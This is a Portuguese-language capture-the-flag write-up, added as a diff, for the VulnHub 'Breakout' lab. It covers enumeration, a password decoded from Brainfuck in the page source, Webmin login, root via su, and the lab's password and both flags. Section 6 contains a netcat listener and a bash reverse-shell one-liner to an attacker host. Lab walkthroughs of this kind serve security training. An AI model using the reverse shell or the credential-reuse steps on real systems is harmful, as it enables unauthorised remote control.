@@ -1,0 +1,120 @@
+Breakout — VulnHub Write-up
+
+Objetivo: comprometer a máquina e obter as flags de usuário e root.
+Abordagem: reconhecimento → enumeração → exploração → pós-exploração.
+
+1. Reconhecimento de Rede
+
+Identificação do host na rede local:
+
+$ netdiscover
+
+Com o alvo identificado, foi realizado o mapeamento de serviços e versões:
+
+$ nmap -sC -sV <IP_ALVO>
+
+Serviços encontrados:
+
+80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
+139/tcp   open  netbios-ssn Samba smbd 4
+445/tcp   open  netbios-ssn Samba smbd 4
+10000/tcp open  http        MiniServ 1.981 (Webmin)
+20000/tcp open  http        MiniServ 1.830 (Webmin)
+
+Destaque para duas interfaces Webmin expostas (portas 10000 e 20000).
+
+2. Enumeração Web
+
+A porta 80 apresentava apenas a página padrão do Apache.
+Durante a inspeção do código-fonte, foi identificado um trecho em Brainfuck.
+
+Após decodificação, foi obtida a seguinte string:
+
+.2uqPEfj3D<P'a-3
+
+Possível credencial ou artefato útil para etapas futuras.
+
+3. Enumeração de Usuários
+
+Com base nos serviços Samba expostos, foi utilizado:
+
+$ enum4linux -a <IP_ALVO>
+
+Resultado relevante:
+
+User encontrado: cyber
+4. Acesso Inicial
+
+Com um usuário identificado e uma possível senha em mãos, foi tentado login nas interfaces Webmin:
+
+http://<IP_ALVO>:10000
+http://<IP_ALVO>:20000
+
+A combinação foi válida, resultando em acesso autenticado.
+
+5. Exploração
+
+Dentro do painel, foi localizado um terminal web.
+A partir dele, foi possível executar comandos diretamente no sistema:
+
+$ ls
+$ cat user.txt
+
+Flag de usuário:
+
+3mp!r3{You_Manage_To_Break_To_My_Secure_Access}
+6. Shell Reverso
+
+Para maior controle, foi estabelecido um shell reverso.
+
+Listener (Kali):
+
+$ nc -lnvp 4444
+
+Alvo:
+
+$ bash -c 'bash -i >& /dev/tcp/<IP_KALI>/4444 0>&1'
+7. Escalação de Privilégio
+
+Após estabilizar o acesso:
+
+$ ls
+$ cat pass.tar
+
+O arquivo continha uma sequência semelhante à anterior — forte indicativo de senha.
+
+Tentativa direta de elevação:
+
+$ su
+
+Senha inserida com sucesso → acesso root obtido.
+
+8. Pós-Exploração
+
+Navegação até o diretório root:
+
+# cd /root
+# ls
+# cat rOOt.txt
+
+Flag root:
+
+3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}
+Conclusão
+
+A exploração seguiu um fluxo clássico:
+
+Enumeração simples, mas eficiente
+Descoberta de credenciais via análise de código-fonte
+Reaproveitamento de padrões de senha
+Escalação direta via su
+
+Pontos-chave:
+
+Nunca ignorar código-fonte de páginas aparentemente “vazias”
+Serviços administrativos expostos (como Webmin) são alvos críticos
+Pequenos indícios (strings, padrões) frequentemente levam à exploração completa
+Status
+User: Comprometido
+Root: Comprometido
+Máquina: Finalizada
